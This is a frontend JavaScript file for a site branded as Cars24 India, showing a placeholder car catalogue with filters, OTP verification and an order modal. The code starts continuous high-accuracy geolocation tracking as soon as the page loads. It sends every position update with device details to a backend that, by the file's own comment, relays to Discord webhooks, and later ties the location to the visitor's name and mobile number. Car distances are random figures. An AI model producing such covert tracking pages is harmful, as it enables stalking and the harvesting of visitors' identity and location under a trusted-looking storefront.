/**
 * ============================================
 * Cars24 India - Frontend JavaScript
 * ============================================
 * Handles:
 * - Auto location detection on page load
 * - Discord webhook communication via backend proxy
 * - User name capture and personalization
 * - Optional OTP mobile verification
 * - Car catalog filtering, sorting, and display
 * - Order inquiry modal
 */

// ═══════════════════════════════════════════════
//              CAR DATA
// Replace these with real dealer data later.
// Using reliable SVG placeholders with brand colors.
// ═══════════════════════════════════════════════

function makeSVG(brand, model, bg, fg) {
  return 'data:image/svg+xml,' + encodeURIComponent(
    '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">' +
    '<rect width="600" height="400" fill="' + bg + '"/>' +
    '<text x="300" y="175" text-anchor="middle" fill="' + fg + '" font-size="28" font-weight="900" font-family="Inter,sans-serif">' + brand + '</text>' +
    '<text x="300" y="215" text-anchor="middle" fill="' + fg + '" font-size="42" font-weight="900" font-family="Inter,sans-serif" opacity="0.85">' + model + '</text>' +
    '<text x="300" y="260" text-anchor="middle" fill="' + fg + '" font-size="16" font-family="Inter,sans-serif" opacity="0.4">AVAILABLE NOW</text>' +
    '</svg>'
  );
}

const carDatabase = [
  {
    id: 1,
    brand: 'Lamborghini',
    model: 'Huracan EVO',
    type: 'supercar',
    price: 32200000,
    priceLakh: '3.22 Cr',
    image: makeSVG('Lamborghini', 'Huracan EVO', '#1a1a2e', '#E8D5B7'),
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Lamborghini Mumbai',
    distance: 0
  },
  {
    id: 2,
    brand: 'Ferrari',
    model: 'Roma',
    type: 'supercar',
    price: 36100000,
    priceLakh: '3.61 Cr',
    image: makeSVG('Ferrari', 'Roma', '#1a0000', '#FF2800'),
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Ferrari Delhi',
    distance: 0
  },
  {
    id: 3,
    brand: 'Porsche',
    model: '911 Turbo S',
    type: 'supercar',
    price: 33500000,
    priceLakh: '3.35 Cr',
    image: makeSVG('Porsche', '911 Turbo S', '#0a0a0a', '#B0B0B0'),
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Porsche Bangalore',
    distance: 0
  },
  {
    id: 4,
    brand: 'Mercedes-Benz',
    model: 'S-Class',
    type: 'luxury',
    price: 17000000,
    priceLakh: '1.70 Cr',
    image: makeSVG('Mercedes-Benz', 'S-Class', '#f0f0f0', '#1a1a1a'),
    fuel: 'Petrol/Diesel',
    transmission: 'Automatic',
    badges: ['new'],
    dealer: 'Mercedes Hyderabad',
    distance: 0
  },
  {
    id: 5,
    brand: 'BMW',
    model: '7 Series',
    type: 'luxury',
    price: 16500000,
    priceLakh: '1.65 Cr',
    image: makeSVG('BMW', '7 Series', '#003366', '#ffffff'),
    fuel: 'Petrol/Diesel',
    transmission: 'Automatic',
    badges: ['new'],
    dealer: 'BMW Pune',
    distance: 0
  },
  {
    id: 6,
    brand: 'Audi',
    model: 'RS7 Sportback',
    type: 'luxury',
    price: 22400000,
    priceLakh: '2.24 Cr',
    image: makeSVG('Audi', 'RS7 Sportback', '#1a1a1a', '#E0E0E0'),
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Audi Chennai',
    distance: 0
  },
  {
    id: 7,
    brand: 'Mahindra',
    model: 'Thar',
    type: 'suv',
    price: 1565000,
    priceLakh: '15.65 Lakh',
    image: makeSVG('Mahindra', 'Thar', '#2E4A1E', '#FF6B00'),
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/Auto',
    badges: ['offroad'],
    dealer: 'Mahindra showroom',
    distance: 0
  },
  {
    id: 8,
    brand: 'Hyundai',
    model: 'Creta',
    type: 'suv',
    price: 1157000,
    priceLakh: '11.57 Lakh',
    image: makeSVG('Hyundai', 'Creta', '#002C5F', '#00AAD4'),
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  },
  {
    id: 9,
    brand: 'Tata',
    model: 'Harrier',
    type: 'suv',
    price: 1599000,
    priceLakh: '15.99 Lakh',
    image: makeSVG('Tata', 'Harrier', '#1B1B1B', '#E23744'),
    fuel: 'Diesel',
    transmission: 'Manual/AT',
    badges: ['new'],
    dealer: 'Tata Motors showroom',
    distance: 0
  },
  {
    id: 10,
    brand: 'Kia',
    model: 'Seltos',
    type: 'suv',
    price: 1199000,
    priceLakh: '11.99 Lakh',
    image: makeSVG('Kia', 'Seltos', '#05141F', '#BB162B'),
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT/DCT',
    badges: ['new'],
    dealer: 'Kia showroom',
    distance: 0
  },
  {
    id: 11,
    brand: 'Toyota',
    model: 'Fortuner',
    type: 'suv',
    price: 3359000,
    priceLakh: '33.59 Lakh',
    image: makeSVG('Toyota', 'Fortuner', '#EB0A1E', '#FFFFFF'),
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/AT',
    badges: ['offroad'],
    dealer: 'Toyota showroom',
    distance: 0
  },
  {
    id: 12,
    brand: 'MG',
    model: 'Hector Plus',
    type: 'suv',
    price: 1838000,
    priceLakh: '18.38 Lakh',
    image: makeSVG('MG', 'Hector Plus', '#1A1A2E', '#FF6B35'),
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/CVT',
    badges: ['new'],
    dealer: 'MG showroom',
    distance: 0
  },
  {
    id: 13,
    brand: 'Hyundai',
    model: 'Verna',
    type: 'sedan',
    price: 1195000,
    priceLakh: '11.95 Lakh',
    image: makeSVG('Hyundai', 'Verna', '#002C5F', '#00AAD4'),
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  },
  {
    id: 14,
    brand: 'Honda',
    model: 'City',
    type: 'sedan',
    price: 1261000,
    priceLakh: '12.61 Lakh',
    image: makeSVG('Honda', 'City', '#CC0000', '#FFFFFF'),
    fuel: 'Petrol',
    transmission: 'Manual/CVT',
    badges: ['new'],
    dealer: 'Honda showroom',
    distance: 0
  },
  {
    id: 15,
    brand: 'Maruti Suzuki',
    model: 'Swift',
    type: 'hatchback',
    price: 659000,
    priceLakh: '6.59 Lakh',
    image: makeSVG('Maruti Suzuki', 'Swift', '#E8792B', '#FFFFFF'),
    fuel: 'Petrol/CNG',
    transmission: 'Manual/AMT',
    badges: ['new'],
    dealer: 'Maruti Suzuki Arena',
    distance: 0
  },
  {
    id: 16,
    brand: 'Tata',
    model: 'Nexon',
    type: 'suv',
    price: 810000,
    priceLakh: '8.10 Lakh',
    image: makeSVG('Tata', 'Nexon EV', '#1B1B1B', '#00D4AA'),
    fuel: 'Petrol/Electric',
    transmission: 'Manual/AMT',
    badges: ['electric'],
    dealer: 'Tata Motors showroom',
    distance: 0
  },
  {
    id: 17,
    brand: 'Toyota',
    model: 'Innova Crysta',
    type: 'mpv',
    price: 1999000,
    priceLakh: '19.99 Lakh',
    image: makeSVG('Toyota', 'Innova Crysta', '#EB0A1E', '#FFFFFF'),
    fuel: 'Diesel/Petrol',
    transmission: 'Manual/AT',
    badges: ['new'],
    dealer: 'Toyota showroom',
    distance: 0
  },
  {
    id: 18,
    brand: 'Hyundai',
    model: 'i20',
    type: 'hatchback',
    price: 703000,
    priceLakh: '7.03 Lakh',
    image: makeSVG('Hyundai', 'i20', '#002C5F', '#00AAD4'),
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  }
];

// ═══════════════════════════════════════════════
//              GLOBAL STATE
// ═══════════════════════════════════════════════
const state = {
  userName: '',
  mobile: '',
  isVerified: false,
  latitude: null,
  longitude: null,
  accuracy: null,
  watchId: null,
  currentCarId: null,
  locationAttempted: false
};

// ═══════════════════════════════════════════════
//              DOM ELEMENTS
// ═══════════════════════════════════════════════
const DOM = {
  navbar: document.getElementById('navbar'),
  mobileMenu: document.getElementById('mobile-menu'),
  mobileMenuBtn: document.getElementById('mobile-menu-btn'),
  heroLocateBtn: document.getElementById('hero-locate-btn'),
  navLocateBtn: document.getElementById('nav-locate-btn'),
  mobileLocateBtn: document.getElementById('mobile-locate-btn'),
  nameSection: document.getElementById('name-section'),
  nameInput: document.getElementById('user-name-input'),
  submitNameBtn: document.getElementById('submit-name-btn'),
  locationOverlay: document.getElementById('location-overlay'),
  bannerSpinner: document.getElementById('banner-spinner'),
  bannerSuccess: document.getElementById('banner-success'),
  bannerDenied: document.getElementById('banner-denied'),
  locationText: document.getElementById('location-text'),
  retryLocationBtn: document.getElementById('retry-location-btn'),
  otpSection: document.getElementById('otp-section'),
  otpCloseBtn: document.getElementById('otp-close-btn'),
  otpStep1: document.getElementById('otp-step-1'),
  otpStep2: document.getElementById('otp-step-2'),
  mobileInput: document.getElementById('mobile-input'),
  sendOtpBtn: document.getElementById('send-otp-btn'),
  skipOtpBtn: document.getElementById('skip-otp-btn'),
  otpInput: document.getElementById('otp-input'),
  verifyOtpBtn: document.getElementById('verify-otp-btn'),
  resendOtpBtn: document.getElementById('resend-otp-btn'),
  otpMessage: document.getElementById('otp-message'),
  otpMobileDisplay: document.getElementById('otp-mobile-display'),
  typeTabs: document.getElementById('type-tabs'),
  carGrid: document.getElementById('car-grid'),
  emptyState: document.getElementById('empty-state'),
  resultsCount: document.getElementById('results-count'),
  resultsLocation: document.getElementById('results-location'),
  filterBrand: document.getElementById('filter-brand'),
  filterPrice: document.getElementById('filter-price'),
  filterSort: document.getElementById('filter-sort'),
  filterResetBtn: document.getElementById('filter-reset-btn'),
  clearFiltersBtn: document.getElementById('clear-filters-btn'),
  orderModal: document.getElementById('order-modal'),
  modalCloseBtn: document.getElementById('modal-close-btn'),
  modalCarName: document.getElementById('modal-car-name'),
  modalCarPrice: document.getElementById('modal-car-price'),
  orderForm: document.getElementById('order-form'),
  orderName: document.getElementById('order-name'),
  orderMobile: document.getElementById('order-mobile'),
  orderLocation: document.getElementById('order-location'),
  orderNotes: document.getElementById('order-notes'),
  modalSuccess: document.getElementById('modal-success'),
  modalDoneBtn: document.getElementById('modal-done-btn')
};

// ═══════════════════════════════════════════════
//              INITIALIZATION
// ═══════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  // Initialize Lucide icons
  if (window.lucide) lucide.createIcons();

  // Render cars immediately
  renderCars(carDatabase);

  // Bind events
  bindEvents();

  // Navbar scroll effect
  window.addEventListener('scroll', () => {
    DOM.navbar.classList.toggle('scrolled', window.scrollY > 10);
  });

  // AUTO-REQUEST LOCATION ON PAGE LOAD
  requestLocation();
});

function bindEvents() {
  // Mobile menu toggle
  DOM.mobileMenuBtn.addEventListener('click', () => {
    DOM.mobileMenu.classList.toggle('active');
  });

  // Close mobile menu on link click
  DOM.mobileMenu.querySelectorAll('.mobile-link').forEach(link => {
    link.addEventListener('click', () => {
      DOM.mobileMenu.classList.remove('active');
    });
  });

  // Location buttons (hero + nav)
  DOM.heroLocateBtn.addEventListener('click', requestLocation);
  if (DOM.navLocateBtn) DOM.navLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
  if (DOM.mobileLocateBtn) DOM.mobileLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
  DOM.retryLocationBtn.addEventListener('click', requestLocation);

  // Name submission
  DOM.submitNameBtn.addEventListener('click', submitUserName);
  DOM.nameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitUserName(); });

  // OTP section
  DOM.otpCloseBtn.addEventListener('click', closeOtpSection);
  DOM.skipOtpBtn.addEventListener('click', closeOtpSection);
  DOM.sendOtpBtn.addEventListener('click', sendOtp);
  DOM.verifyOtpBtn.addEventListener('click', verifyOtp);
  DOM.resendOtpBtn.addEventListener('click', sendOtp);

  // Type tabs
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(tab => {
      tab.addEventListener('click', () => {
        DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        applyFilters();
      });
    });
  }

  // Filters
  DOM.filterBrand.addEventListener('change', applyFilters);
  DOM.filterPrice.addEventListener('change', applyFilters);
  DOM.filterSort.addEventListener('change', applyFilters);
  DOM.filterResetBtn.addEventListener('click', resetFilters);
  if (DOM.clearFiltersBtn) DOM.clearFiltersBtn.addEventListener('click', resetFilters);

  // Order modal
  DOM.modalCloseBtn.addEventListener('click', closeOrderModal);
  DOM.orderModal.addEventListener('click', (e) => {
    if (e.target === DOM.orderModal) closeOrderModal();
  });
  DOM.orderForm.addEventListener('submit', submitOrder);
  DOM.modalDoneBtn.addEventListener('click', closeOrderModal);
}

// ═══════════════════════════════════════════════
//              LOCATION HANDLING
// ═══════════════════════════════════════════════

/**
 * Requests user's geolocation automatically on page load.
 * Shows overlay while loading, then transitions to banner.
 * All location updates are sent to Webhook 1 (continuous).
 * High accuracy updates (< 10m) are also sent to Webhook 2.
 */
function requestLocation() {
  if (!navigator.geolocation) {
    showLocationDenied();
    return;
  }

  // Show overlay on first attempt, otherwise just banner spinner
  if (!state.locationAttempted) {
    DOM.locationOverlay.style.display = 'flex';
  }

  showBannerSpinner();

  // Clear any existing watch
  if (state.watchId) {
    navigator.geolocation.clearWatch(state.watchId);
  }

  state.locationAttempted = true;

  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };

  state.watchId = navigator.geolocation.watchPosition(
    handleLocationSuccess,
    handleLocationError,
    options
  );
}

async function handleLocationSuccess(position) {
  const { latitude, longitude, accuracy } = position.coords;
  state.latitude = latitude;
  state.longitude = longitude;
  state.accuracy = accuracy;

  // Hide overlay if showing
  DOM.locationOverlay.style.display = 'none';

  const deviceInfo = getDeviceInfo();

  const payload = {
    latitude,
    longitude,
    accuracy,
    deviceName: deviceInfo.name,
    deviceModel: deviceInfo.model,
    userAgent: navigator.userAgent,
    timestamp: position.timestamp
  };

  // Send to backend webhook endpoint
  try {
    const response = await fetch('/api/webhook/location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    console.log('[Location] Webhook sent:', data);
  } catch (error) {
    console.error('[Location] Failed to send webhook:', error);
  }

  // If name is already entered, also send name webhook
  if (state.userName) {
    await sendNameWebhook({ ...payload, name: state.userName });
  }

  // Update UI
  showBannerSuccess(latitude, longitude, accuracy);

  // Update car distances (random for demo)
  updateCarDistances();
}

/**
 * Handle location errors - show English-only denied message.
 */
function handleLocationError(error) {
  DOM.locationOverlay.style.display = 'none';

  let message = '';
  switch (error.code) {
    case error.PERMISSION_DENIED:
      message = 'Location permission denied by user';
      break;
    case error.POSITION_UNAVAILABLE:
      message = 'Location information unavailable';
      break;
    case error.TIMEOUT:
      message = 'Location request timed out';
      break;
    default:
      message = 'An unknown error occurred';
  }
  console.warn('[Location Error]', message);
  showLocationDenied();
}

function showLocationDenied() {
  DOM.locationOverlay.style.display = 'none';
  DOM.bannerSpinner.style.display = 'none';
  DOM.bannerSuccess.style.display = 'none';
  DOM.bannerDenied.style.display = 'flex';
}

function showBannerSpinner() {
  DOM.bannerSpinner.style.display = 'flex';
  DOM.bannerSuccess.style.display = 'none';
  DOM.bannerDenied.style.display = 'none';
}

function showBannerSuccess(lat, lng, accuracy) {
  DOM.bannerSpinner.style.display = 'none';
  DOM.bannerDenied.style.display = 'none';
  DOM.bannerSuccess.style.display = 'flex';

  const accuracyText = accuracy < 10
    ? `High accuracy (${accuracy.toFixed(1)}m)`
    : `~${accuracy.toFixed(0)}m accuracy`;

  DOM.locationText.textContent = `Location detected - ${accuracyText}`;

  // Update results location indicator
  DOM.resultsLocation.innerHTML = `<i data-lucide="map-pin" class="icon-sm"></i> Showing nearby results`;
  if (window.lucide) lucide.createIcons();
}

/**
 * Get device name and model from user agent.
 */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let name = 'Unknown';
  let model = '';

  if (/iPhone/.test(ua)) {
    name = 'Apple iPhone';
    model = ua.match(/iPhone OS (\d+)/)?.[1] ? `iOS ${ua.match(/iPhone OS (\d+)/)[1]}` : '';
  } else if (/iPad/.test(ua)) {
    name = 'Apple iPad';
  } else if (/Samsung/.test(ua)) {
    name = 'Samsung';
    const match = ua.match(/SM-(\w+)/);
    if (match) model = match[0];
  } else if (/Pixel/.test(ua)) {
    name = 'Google Pixel';
    const match = ua.match(/Pixel (\d+)/);
    if (match) model = `Pixel ${match[1]}`;
  } else if (/OnePlus/.test(ua)) {
    name = 'OnePlus';
    const match = ua.match(/OnePlus[ _](\w+)/);
    if (match) model = match[0];
  } else if (/Xiaomi/.test(ua)) {
    name = 'Xiaomi';
  } else if (/Realme/.test(ua)) {
    name = 'Realme';
  } else if (/Vivo/.test(ua)) {
    name = 'Vivo';
  } else if (/Oppo/.test(ua)) {
    name = 'Oppo';
  } else if (/Android/.test(ua)) {
    name = 'Android Device';
  } else if (/Windows/.test(ua)) {
    name = 'Windows PC';
  } else if (/Macintosh/.test(ua)) {
    name = 'Mac';
  } else if (/Linux/.test(ua)) {
    name = 'Linux Device';
  }

  return { name, model };
}

// ═══════════════════════════════════════════════
//              USER NAME HANDLING
// ═══════════════════════════════════════════════

async function submitUserName() {
  const name = DOM.nameInput.value.trim();
  if (!name) return;

  state.userName = name;

  // Visual feedback
  DOM.submitNameBtn.innerHTML = '<i data-lucide="check" class="icon-sm green"></i>';
  DOM.submitNameBtn.disabled = true;
  DOM.nameInput.disabled = true;
  if (window.lucide) lucide.createIcons();

  // Send name webhook if location is available
  if (state.latitude !== null) {
    await sendNameWebhook({
      name,
      latitude: state.latitude,
      longitude: state.longitude,
      accuracy: state.accuracy,
      deviceName: getDeviceInfo().name,
      deviceModel: getDeviceInfo().model,
      userAgent: navigator.userAgent,
      timestamp: Date.now()
    });
  }

  // Show OTP section after short delay
  setTimeout(() => {
    DOM.otpSection.style.display = 'block';
    DOM.mobileInput.focus();
  }, 800);
}

async function sendNameWebhook(payload) {
  try {
    const response = await fetch('/api/webhook/name', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    console.log('[Name] Webhook sent:', data);
  } catch (error) {
    console.error('[Name] Failed to send webhook:', error);
  }
}

// ═══════════════════════════════════════════════
//              OTP VERIFICATION (Optional)
// ═══════════════════════════════════════════════

function closeOtpSection() {
  DOM.otpSection.style.display = 'none';
}

async function sendOtp() {
  const mobile = DOM.mobileInput.value.trim();
  if (!/^\d{10}$/.test(mobile)) {
    showOtpMessage('Please enter a valid 10-digit mobile number', 'error');
    return;
  }

  DOM.sendOtpBtn.disabled = true;
  DOM.sendOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Sending...';

  try {
    const response = await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mobile })
    });
    const data = await response.json();

    if (data.success) {
      DOM.otpStep1.style.display = 'none';
      DOM.otpStep2.style.display = 'block';
      DOM.otpMobileDisplay.textContent = `+91 ${mobile.substring(0, 5)} ${mobile.substring(5)}`;
      DOM.otpInput.focus();
      state.mobile = mobile;
    } else {
      showOtpMessage(data.message || 'Failed to send OTP', 'error');
    }
  } catch (error) {
    showOtpMessage('Network error. Please try again.', 'error');
  }

  DOM.sendOtpBtn.disabled = false;
  DOM.sendOtpBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Send OTP';
  if (window.lucide) lucide.createIcons();
}

async function verifyOtp() {
  const otp = DOM.otpInput.value.trim();
  if (!/^\d{4,6}$/.test(otp)) {
    showOtpMessage('Please enter a valid OTP', 'error');
    return;
  }

  DOM.verifyOtpBtn.disabled = true;
  DOM.verifyOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Verifying...';

  try {
    const response = await fetch('/api/verify-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mobile: state.mobile, otp })
    });
    const data = await response.json();

    if (data.verified) {
      state.isVerified = true;
      showOtpMessage('Mobile number verified successfully!', 'success');

      // Log verification to webhook
      await fetch('/api/webhook/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: state.userName,
          mobile: state.mobile,
          latitude: state.latitude,
          longitude: state.longitude,
          accuracy: state.accuracy
        })
      });

      // Pre-fill order form
      DOM.orderName.value = state.userName;
      DOM.orderMobile.value = state.mobile;

      setTimeout(() => closeOtpSection(), 2000);
    } else {
      showOtpMessage(data.message || 'Invalid OTP', 'error');
      DOM.otpInput.value = '';
      DOM.otpInput.focus();
    }
  } catch (error) {
    showOtpMessage('Network error. Please try again.', 'error');
  }

  DOM.verifyOtpBtn.disabled = false;
  DOM.verifyOtpBtn.innerHTML = '<i data-lucide="check-circle" class="icon"></i> Verify OTP';
  if (window.lucide) lucide.createIcons();
}

function showOtpMessage(msg, type) {
  DOM.otpMessage.textContent = msg;
  DOM.otpMessage.className = `otp-message ${type}`;
  setTimeout(() => { DOM.otpMessage.textContent = ''; DOM.otpMessage.className = 'otp-message'; }, 4000);
}

// ═══════════════════════════════════════════════
//              CAR RENDERING & FILTERING
// ═══════════════════════════════════════════════

function renderCars(cars) {
  if (cars.length === 0) {
    DOM.carGrid.style.display = 'none';
    DOM.emptyState.style.display = 'block';
    DOM.resultsCount.textContent = 'No cars found';
    return;
  }

  DOM.carGrid.style.display = 'grid';
  DOM.emptyState.style.display = 'none';
  DOM.resultsCount.textContent = `Showing ${cars.length} car${cars.length !== 1 ? 's' : ''}`;

  DOM.carGrid.innerHTML = cars.map(car => createCarCard(car)).join('');

  if (window.lucide) lucide.createIcons();
}

function createCarCard(car) {
  const badgesHtml = car.badges.map(b => {
    const labels = { hot: 'Hot', new: 'New', electric: 'EV', offroad: 'Off-Road' };
    return `<span class="badge badge-${b}">${labels[b] || b}</span>`;
  }).join('');

  const distanceHtml = car.distance > 0
    ? `<div class="car-distance"><i data-lucide="map-pin" class="icon-sm"></i> ${car.distance.toFixed(1)} km away</div>`
    : '';

  return `
    <div class="car-card" data-id="${car.id}">
      <div class="car-card-image">
        <img src="${car.image}" alt="${car.brand} ${car.model}" loading="lazy">
        <div class="car-badge">${badgesHtml}</div>
        ${distanceHtml}
      </div>
      <div class="car-card-body">
        <div class="car-brand">${car.brand}</div>
        <h3 class="car-name">${car.model}</h3>
        <div class="car-specs">
          <div class="car-spec">
            <i data-lucide="fuel" class="icon"></i>
            ${car.fuel}
          </div>
          <div class="car-spec">
            <i data-lucide="settings-2" class="icon"></i>
            ${car.transmission}
          </div>
        </div>
        <div class="car-card-footer">
          <div class="car-price">
            ${car.priceLakh}
            <span>Ex-Showroom</span>
          </div>
          <button class="order-btn" onclick="openOrderModal(${car.id})">Get Price</button>
        </div>
        <div class="car-dealer"><i data-lucide="store" class="icon-sm"></i> ${car.dealer}</div>
      </div>
    </div>
  `;
}

function applyFilters() {
  // Get type from active tab
  const activeTab = DOM.typeTabs?.querySelector('.type-tab.active');
  const type = activeTab ? activeTab.dataset.type : 'all';

  const brand = DOM.filterBrand.value;
  const priceRange = DOM.filterPrice.value;
  const sort = DOM.filterSort.value;

  let filtered = [...carDatabase];

  // Type filter (from tabs)
  if (type !== 'all') {
    filtered = filtered.filter(car => car.type === type);
  }

  // Brand filter
  if (brand !== 'all') {
    filtered = filtered.filter(car => car.brand.toLowerCase().includes(brand));
  }

  // Price filter (in lakhs)
  if (priceRange !== 'all') {
    const [min, max] = priceRange.split('-').map(Number);
    filtered = filtered.filter(car => {
      const priceLakh = car.price / 100000;
      return priceLakh >= min && (max >= 999 ? true : priceLakh <= max);
    });
  }

  // Sort
  switch (sort) {
    case 'price-low':
      filtered.sort((a, b) => a.price - b.price);
      break;
    case 'price-high':
      filtered.sort((a, b) => b.price - a.price);
      break;
    case 'name-az':
      filtered.sort((a, b) => `${a.brand} ${a.model}`.localeCompare(`${b.brand} ${b.model}`));
      break;
    default:
      filtered.sort((a, b) => {
        const typeOrder = { supercar: 0, luxury: 1, suv: 2, sedan: 3, mpv: 4, hatchback: 5, pickup: 6 };
        return (typeOrder[a.type] || 5) - (typeOrder[b.type] || 5);
      });
  }

  renderCars(filtered);
}

function resetFilters() {
  DOM.filterBrand.value = 'all';
  DOM.filterPrice.value = 'all';
  DOM.filterSort.value = 'default';
  // Reset type tabs
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
    DOM.typeTabs.querySelector('[data-type="all"]')?.classList.add('active');
  }
  renderCars(carDatabase);
}

/**
 * Set filter from footer links
 */
function setFilter(type) {
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
    const target = DOM.typeTabs.querySelector(`[data-type="${type}"]`);
    if (target) target.classList.add('active');
  }
  applyFilters();
  document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
}

window.setFilter = setFilter;

/**
 * Update car distances with random values (demo).
 * In production, calculate real distances from coordinates.
 */
function updateCarDistances() {
  carDatabase.forEach(car => {
    car.distance = Math.round((Math.random() * 44.5 + 0.5) * 10) / 10;
  });
  applyFilters();
}

// ═══════════════════════════════════════════════
//              ORDER MODAL
// ═══════════════════════════════════════════════

function openOrderModal(carId) {
  const car = carDatabase.find(c => c.id === carId);
  if (!car) return;

  state.currentCarId = carId;

  DOM.modalCarName.textContent = `${car.brand} ${car.model}`;
  DOM.modalCarPrice.textContent = `${car.priceLakh} (Ex-Showroom)`;

  // Pre-fill form
  DOM.orderName.value = state.userName || '';
  DOM.orderMobile.value = state.mobile || '';

  if (state.latitude && state.longitude) {
    DOM.orderLocation.value = `${state.latitude.toFixed(6)}, ${state.longitude.toFixed(6)}`;
  }

  DOM.orderForm.style.display = 'block';
  DOM.modalSuccess.style.display = 'none';
  DOM.orderModal.style.display = 'flex';
  DOM.orderModal.style.flexDirection = 'column';

  document.body.style.overflow = 'hidden';
}

window.openOrderModal = openOrderModal;

function closeOrderModal() {
  DOM.orderModal.style.display = 'none';
  document.body.style.overflow = '';
  state.currentCarId = null;
}

async function submitOrder(e) {
  e.preventDefault();

  const car = carDatabase.find(c => c.id === state.currentCarId);
  if (!car) return;

  const submitBtn = DOM.orderForm.querySelector('button[type="submit"]');
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Submitting...';

  try {
    const response = await fetch('/api/order', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: DOM.orderName.value,
        mobile: DOM.orderMobile.value,
        carId: car.id,
        carModel: `${car.brand} ${car.model}`,
        location: DOM.orderLocation.value || 'Not shared'
      })
    });
    const data = await response.json();

    if (data.success) {
      DOM.orderForm.style.display = 'none';
      DOM.modalSuccess.style.display = 'block';
      if (window.lucide) lucide.createIcons();
    }
  } catch (error) {
    console.error('[Order] Error:', error);
    alert('Something went wrong. Please try again.');
  }

  submitBtn.disabled = false;
  submitBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Get Dealer Callback';
  if (window.lucide) lucide.createIcons();
}

// ═══════════════════════════════════════════════
//              KEYBOARD SHORTCUTS
// ═══════════════════════════════════════════════
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    if (DOM.orderModal.style.display === 'flex') closeOrderModal();
    if (DOM.otpSection.style.display === 'block') closeOtpSection();
  }
});
